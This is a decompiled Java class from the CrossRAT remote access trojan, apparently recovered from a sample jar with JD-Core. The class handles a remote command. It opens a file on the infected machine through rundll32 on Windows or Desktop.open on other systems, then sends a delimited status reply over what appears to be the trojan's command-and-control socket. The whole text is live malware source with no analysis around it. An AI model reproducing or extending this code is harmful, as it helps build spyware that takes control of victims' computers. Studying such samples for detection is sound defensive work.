package crossrat;

import a.a;
import a.c;
import java.awt.Desktop;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;
import java.net.Socket;

final class i
  extends Thread
{
  private String a;
  
  public i(String paramString)
  {
    this.a = paramString;
  }
  
  public final void run()
  {
    File localFile = new File(this.a);
    a locala = c.b();
    DataOutputStream localDataOutputStream = null;
    Object localObject;
    try
    {
      localDataOutputStream = new DataOutputStream(k.k.getOutputStream());
    }
    catch (Exception localException1)
    {
      (localObject = localException1).printStackTrace();
    }
    if (localFile.exists()) {
      if (locala.a() == c.a) {
        try
        {
          Runtime.getRuntime().exec(new String[] { "rundll32", "url.dll,FileProtocolHandler", localFile.getAbsolutePath() });
        }
        catch (IOException localIOException1)
        {
          (localObject = localIOException1).printStackTrace();
        }
      } else if ((locala.a() == c.b) || (locala.a() == c.c)) {
        try
        {
          Desktop.getDesktop().open(localFile);
        }
        catch (IOException localIOException2)
        {
          (localObject = localIOException2).printStackTrace();
        }
      } else if (Desktop.isDesktopSupported()) {
        try
        {
          Desktop.getDesktop().open(localFile);
        }
        catch (IOException localIOException3)
        {
          (localObject = localIOException3).printStackTrace();
        }
      }
    }
    try
    {
      localDataOutputStream.writeBytes(k.g + k.d + k.J + k.d + "&&&");
      return;
    }
    catch (Exception localException2)
    {
      (localObject = localException2).printStackTrace();
    }
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\crossrat\i.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */